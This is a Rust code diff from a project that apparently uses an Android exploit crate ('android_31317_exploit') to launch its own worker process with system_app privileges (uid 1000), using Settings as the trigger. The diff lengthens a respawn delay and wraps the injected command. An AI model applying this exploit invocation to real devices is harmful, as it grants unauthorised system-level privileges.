@@ -107,7 +107,7 @@ impl WorkerProcess {
                     process::exit(1);
                 }
 
-                sleep(Duration::from_secs(1)).await;
+                sleep(Duration::from_secs(5)).await;
 
                 let _ = Self::spawn();
             }
@@ -122,14 +122,17 @@ impl WorkerProcess {
         use android_31317_exploit::{ExploitKind, TriggerApp, build_and_execute};
         use std::env;
 
-        let path = env::current_exe()?;
+        let executable = env::current_exe()?;
+        let executable = executable.display();
 
         build_and_execute(
             1000,
             "/data/",
             "com.android.settings",
             "platform:system_app:targetSdkVersion=29:complete",
-            &ExploitKind::Command(format!("{} worker", path.display())),
+            &ExploitKind::Command(format!(
+                "{executable} internal-wrapper \"{executable} worker\""
+            )),
             &TriggerApp::new(
                 "com.android.settings".into(),
                 "com.android.settings.Settings".into(),
